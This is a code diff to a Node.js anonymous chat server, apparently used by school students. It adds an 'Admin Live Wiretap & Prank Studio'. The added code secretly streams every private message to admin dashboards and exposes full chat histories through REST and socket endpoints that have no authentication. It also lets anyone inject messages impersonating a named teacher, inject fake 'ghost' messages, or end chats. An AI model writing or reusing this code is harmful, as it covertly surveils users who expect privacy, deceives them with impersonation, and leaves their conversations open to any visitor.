@@ -101,9 +101,18 @@ app.use((req, res, next) => {
   next();
 });
 
+// Parse incoming JSON and form payloads for REST APIs
+app.use(express.json({ limit: '2mb' }));
+app.use(express.urlencoded({ extended: true, limit: '2mb' }));
+
 // Route root to main chat app
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'app-chat.html'));
+});
+
+// Admin Live Wiretap & Prank Studio Dashboard
+app.get('/admin', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
 });
 
 // Serve static frontend files
@@ -169,6 +178,7 @@ app.post('/api/whats-new/ack', (req, res) => {
 let waitingQueue = [];
 const activeRooms = new Map(); // socket.id -> { partnerId, roomId }
 const aiAgentSockets = new Set(); // socket.id of connected AI agents
+const adminSockets = new Set(); // socket.id of connected Admin Mission Control dashboards
 
 // --- Private Chat Session Logger (Structured for AI Training Datasets) ---
 const CHAT_LOG_DIR = path.join(__dirname, 'chat');
@@ -317,6 +327,93 @@ function recordChatSystemEvent(roomId, eventType, text) {
 
   session.messages.push(entry);
   scheduleSessionFlush(session);
+}
+
+// --- Admin Live Wiretap & Prank Studio Helpers ---
+function getAdminRoomsSummary() {
+  const roomMap = new Map();
+  for (const [socketId, info] of activeRooms.entries()) {
+    if (!roomMap.has(info.roomId)) {
+      const session = chatSessions.get(info.roomId);
+      const partnerSocketId = info.partnerId;
+      roomMap.set(info.roomId, {
+        roomId: info.roomId,
+        vibe: session ? session.vibe : 'Direct',
+        startTime: session ? session.startTime : new Date().toISOString(),
+        durationSeconds: session ? Math.max(0, Math.round((Date.now() - new Date(session.startTime).getTime()) / 1000)) : 0,
+        messageCount: session ? session.messages.length : 0,
+        participants: [
+          { socketId, alias: session?.userAliases?.[socketId] || 'Student_1' },
+          { socketId: partnerSocketId, alias: session?.userAliases?.[partnerSocketId] || 'Student_2' }
+        ],
+        lastMessage: session && session.messages.length ? session.messages[session.messages.length - 1] : null
+      });
+    }
+  }
+  return Array.from(roomMap.values());
+}
+
+function broadcastToAdmins(event, data) {
+  if (adminSockets.size === 0) return;
+  for (const adminId of adminSockets) {
+    const s = io.sockets.sockets.get(adminId);
+    if (s && s.connected) {
+      s.emit(event, data);
+    }
+  }
+}
+
+function broadcastAdminStats() {
+  const distinctRooms = new Set();
+  for (const info of activeRooms.values()) {
+    distinctRooms.add(info.roomId);
+  }
+  broadcastToAdmins('admin_stats', {
+    onlineCount: io.engine.clientsCount,
+    activeRoomsCount: distinctRooms.size,
+    waitingCount: waitingQueue.length,
+    monitoredSessionsCount: chatSessions.size
+  });
+}
+
+function notifyAdminRoomCreated(roomId, vibe, participants) {
+  broadcastToAdmins('admin_room_created', {
+    roomId,
+    vibe,
+    startTime: new Date().toISOString(),
+    participants,
+    messageCount: 0
+  });
+  broadcastAdminStats();
+}
+
+function notifyAdminRoomClosed(roomId) {
+  broadcastToAdmins('admin_room_closed', { roomId });
+  broadcastAdminStats();
+}
+
+function notifyAdminNewMessage(roomId, senderSocketId, text, audio, image, replyTo, ephemeral, extra = null) {
+  const session = chatSessions.get(roomId);
+  let senderAlias = 'Student_1';
+  if (session && session.userAliases && session.userAliases[senderSocketId]) {
+    senderAlias = session.userAliases[senderSocketId];
+  } else if (senderSocketId === 'SYSTEM') {
+    senderAlias = extra?.name ? extra.name : 'System';
+  }
+
+  broadcastToAdmins('admin_message_feed', {
+    roomId,
+    msgId: `msg_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`,
+    senderSocketId,
+    senderAlias,
+    text: text || '',
+    audio: !!audio,
+    image: !!image,
+    replyTo: replyTo || null,
+    ephemeral: !!ephemeral,
+    timestamp: Date.now(),
+    extra: extra || null
+  });
 }
 
 // GitHub Auto-Upload Sync Queue (Supports GitHub REST API on Render + Local Git CLI)
@@ -503,6 +600,12 @@ function triggerJobySirIntervention(roomId, senderSocket = null, partnerSocket =
     if (senderSocket && senderSocket.connected) senderSocket.emit('joby_sir_message', messagePayload);
     if (partnerSocket && partnerSocket.connected) partnerSocket.emit('joby_sir_message', messagePayload);
     recordChatSystemEvent(roomId, 'teacher_intervention', `Joby Sir: ${JOBY_MESSAGE_TEXT}`);
+    notifyAdminNewMessage(roomId, 'SYSTEM', JOBY_MESSAGE_TEXT, null, null, null, false, {
+      isPrank: true,
+      name: 'Joby Jacob Sir',
+      role: 'Discipline Incharge',
+      photo: JOBY_PHOTO
+    });
   }, 1200);
 }
 
@@ -563,6 +666,12 @@ function pairUsers(socketA, socketB, vibeLabel = 'Direct') {
 
   socketA.emit('chat_start', { roomId, partnerHash: hashB });
   socketB.emit('chat_start', { roomId, partnerHash: hashA });
+
+  // Real-time broadcast to Admin wiretap
+  notifyAdminRoomCreated(roomId, vibeLabel, [
+    { socketId: socketA.id, hash: hashA, alias: 'Student_1' },
+    { socketId: socketB.id, hash: hashB, alias: 'Student_2' }
+  ]);
 }
 
 function removeFromQueue(socketId) {
@@ -605,6 +714,9 @@ function cleanupUser(socketId, notifyPartner = true) {
         }
       }
     }
+
+    // Notify live Admin dashboards
+    notifyAdminRoomClosed(roomId);
   }
 }
 
@@ -794,6 +906,9 @@ io.on('connection', (socket) => {
           ephemeral: ephemeral
         });
 
+        // Broadcast to Admin live wiretap
+        notifyAdminNewMessage(roomId, socket.id, sanitized, audioPayload, imagePayload, replyTo, ephemeral);
+
         // Trigger Joby Sir Discipline Easter Egg if bad words / gali detected
         if (sanitized && containsAbuse(sanitized)) {
           triggerJobySirIntervention(roomId, socket, partnerSocket);
@@ -935,12 +1050,264 @@ io.on('connection', (socket) => {
     socket.emit('chat_ended');
   });
 
+  // ==========================================
+  // Admin Mission Control & Prank Studio Hub
+  // ==========================================
+  socket.on('admin_init', () => {
+    adminSockets.add(socket.id);
+    const distinctRooms = new Set();
+    for (const info of activeRooms.values()) {
+      distinctRooms.add(info.roomId);
+    }
+    socket.emit('admin_init_data', {
+      stats: {
+        onlineCount: io.engine.clientsCount,
+        activeRoomsCount: distinctRooms.size,
+        waitingCount: waitingQueue.length,
+        monitoredSessionsCount: chatSessions.size
+      },
+      rooms: getAdminRoomsSummary()
+    });
+  });
+
+  socket.on('admin_get_room_history', (payload) => {
+    const roomId = payload && payload.roomId ? payload.roomId : null;
+    if (!roomId) return;
+    const session = chatSessions.get(roomId);
+    socket.emit('admin_room_history', {
+      roomId,
+      session: session ? {
+        roomId: session.roomId,
+        vibe: session.vibe,
+        startTime: session.startTime,
+        messages: session.messages,
+        userAliases: session.userAliases
+      } : null
+    });
+  });
+
+  socket.on('admin_send_prank', (data) => {
+    if (!data) return;
+    const targetRoomId = data.targetRoomId;
+    const name = (data.name || 'Joby Jacob Sir').trim().slice(0, 50);
+    const role = (data.role || 'Discipline Incharge').trim().slice(0, 50);
+    const text = (data.text || 'i told you beta gali nahi dene ka meet tommarow').trim().slice(0, 1000);
+    const photo = data.photo || JOBY_PHOTO;
+    const fallbackPhoto = data.fallbackPhoto || '/joby-sir.jpg';
+    const withSiren = data.siren !== false;
+    const withTyping = !!data.typingBefore;
+    const prankType = data.prankType || 'joby_card';
+    const footer = data.footer || 'Staff Room / Discipline Alert • SJS Kaushambi';
+
+    const targetRooms = [];
+    if (targetRoomId === 'ALL') {
+      const distinct = new Set();
+      for (const info of activeRooms.values()) {
+        distinct.add(info.roomId);
+      }
+      targetRooms.push(...Array.from(distinct));
+    } else if (targetRoomId) {
+      targetRooms.push(targetRoomId);
+    }
+
+    if (targetRooms.length === 0) {
+      socket.emit('admin_prank_ack', {
+        success: false,
+        message: 'No active rooms currently selected or found'
+      });
+      return;
+    }
+
+    for (const rId of targetRooms) {
+      if (prankType === 'joby_card') {
+        const incomingPayload = {
+          name,
+          role,
+          forced: true,
+          siren: withSiren
+        };
+
+        const messagePayload = {
+          id: `prank_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`,
+          name,
+          role,
+          photo,
+          fallbackPhoto,
+          text,
+          footer,
+          timestamp: Date.now(),
+          forced: true,
+          siren: withSiren
+        };
+
+        if (withTyping) {
+          io.to(rId).emit('joby_sir_incoming', incomingPayload);
+          setTimeout(() => {
+            io.to(rId).emit('joby_sir_message', messagePayload);
+            recordChatSystemEvent(rId, 'teacher_intervention', `${name} (${role}): ${text}`);
+            notifyAdminNewMessage(rId, 'SYSTEM', text, null, null, null, false, {
+              isPrank: true,
+              name,
+              role,
+              photo
+            });
+          }, 1300);
+        } else {
+          io.to(rId).emit('joby_sir_message', messagePayload);
+          recordChatSystemEvent(rId, 'teacher_intervention', `${name} (${role}): ${text}`);
+          notifyAdminNewMessage(rId, 'SYSTEM', text, null, null, null, false, {
+            isPrank: true,
+            name,
+            role,
+            photo
+          });
+        }
+      } else if (prankType === 'normal_msg') {
+        const fakeMsg = {
+          msgId: `ghost_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`,
+          text: `[${name}]: ${text}`,
+          timestamp: Date.now()
+        };
+        io.to(rId).emit('receive_message', fakeMsg);
+        recordChatSystemEvent(rId, 'ghost_message', `[${name}]: ${text}`);
+        notifyAdminNewMessage(rId, 'SYSTEM', `[${name}]: ${text}`, null, null, null, false, {
+          isPrank: true,
+          name,
+          role: 'Ghost',
+          photo
+        });
+      }
+    }
+
+    socket.emit('admin_prank_ack', {
+      success: true,
+      roomsCount: targetRooms.length,
+      message: `Prank message sent to ${targetRooms.length} room(s)!`
+    });
+  });
+
+  socket.on('admin_disconnect_room', ({ roomId }) => {
+    if (!roomId) return;
+    for (const [sId, info] of activeRooms.entries()) {
+      if (info.roomId === roomId) {
+        const sock = io.sockets.sockets.get(sId);
+        if (sock) {
+          sock.emit('partner_disconnected', { message: 'Chat terminated by Administrator.' });
+        }
+        cleanupUser(sId, false);
+      }
+    }
+    socket.emit('admin_room_closed', { roomId });
+  });
+
   // Socket disconnected
   socket.on('disconnect', () => {
+    adminSockets.delete(socket.id);
     aiAgentSockets.delete(socket.id);
     cleanupUser(socket.id, true);
     broadcastOnlineCount();
+    broadcastAdminStats();
   });
+});
+
+// --- Admin REST API Endpoints ---
+app.get('/api/admin/rooms', (req, res) => {
+  const distinctRooms = new Set();
+  for (const info of activeRooms.values()) {
+    distinctRooms.add(info.roomId);
+  }
+  res.json({
+    stats: {
+      onlineCount: io.engine.clientsCount,
+      activeRoomsCount: distinctRooms.size,
+      waitingCount: waitingQueue.length,
+      monitoredSessionsCount: chatSessions.size
+    },
+    rooms: getAdminRoomsSummary()
+  });
+});
+
+app.get('/api/admin/room/:roomId', (req, res) => {
+  const session = chatSessions.get(req.params.roomId);
+  if (!session) return res.status(404).json({ error: 'Room not found or ended' });
+  res.json({
+    roomId: session.roomId,
+    vibe: session.vibe,
+    startTime: session.startTime,
+    messages: session.messages,
+    userAliases: session.userAliases
+  });
+});
+
+app.post('/api/admin/prank', (req, res) => {
+  const data = req.body || {};
+  const targetRoomId = data.targetRoomId;
+  const name = (data.name || 'Joby Jacob Sir').trim().slice(0, 50);
+  const role = (data.role || 'Discipline Incharge').trim().slice(0, 50);
+  const text = (data.text || 'i told you beta gali nahi dene ka meet tommarow').trim().slice(0, 1000);
+  const photo = data.photo || JOBY_PHOTO;
+  const fallbackPhoto = data.fallbackPhoto || '/joby-sir.jpg';
+  const withSiren = data.siren !== false;
+  const withTyping = !!data.typingBefore;
+  const prankType = data.prankType || 'joby_card';
+  const footer = data.footer || 'Staff Room / Discipline Alert • SJS Kaushambi';
+
+  const targetRooms = [];
+  if (targetRoomId === 'ALL') {
+    const distinct = new Set();
+    for (const info of activeRooms.values()) {
+      distinct.add(info.roomId);
+    }
+    targetRooms.push(...Array.from(distinct));
+  } else if (targetRoomId) {
+    targetRooms.push(targetRoomId);
+  }
+
+  if (targetRooms.length === 0) {
+    return res.status(400).json({ success: false, message: 'No active rooms found' });
+  }
+
+  for (const rId of targetRooms) {
+    if (prankType === 'joby_card') {
+      const incomingPayload = { name, role, forced: true, siren: withSiren };
+      const messagePayload = {
+        id: `prank_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`,
+        name,
+        role,
+        photo,
+        fallbackPhoto,
+        text,
+        footer,
+        timestamp: Date.now(),
+        forced: true,
+        siren: withSiren
+      };
+
+      if (withTyping) {
+        io.to(rId).emit('joby_sir_incoming', incomingPayload);
+        setTimeout(() => {
+          io.to(rId).emit('joby_sir_message', messagePayload);
+          recordChatSystemEvent(rId, 'teacher_intervention', `${name} (${role}): ${text}`);
+          notifyAdminNewMessage(rId, 'SYSTEM', text, null, null, null, false, { isPrank: true, name, role, photo });
+        }, 1300);
+      } else {
+        io.to(rId).emit('joby_sir_message', messagePayload);
+        recordChatSystemEvent(rId, 'teacher_intervention', `${name} (${role}): ${text}`);
+        notifyAdminNewMessage(rId, 'SYSTEM', text, null, null, null, false, { isPrank: true, name, role, photo });
+      }
+    } else {
+      const fakeMsg = {
+        msgId: `ghost_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`,
+        text: `[${name}]: ${text}`,
+        timestamp: Date.now()
+      };
+      io.to(rId).emit('receive_message', fakeMsg);
+      recordChatSystemEvent(rId, 'ghost_message', `[${name}]: ${text}`);
+      notifyAdminNewMessage(rId, 'SYSTEM', `[${name}]: ${text}`, null, null, null, false, { isPrank: true, name, role: 'Ghost', photo });
+    }
+  }
+
+  res.json({ success: true, count: targetRooms.length, message: `Dispatched to ${targetRooms.length} rooms` });
 });
 
 // Process crash resilience guards
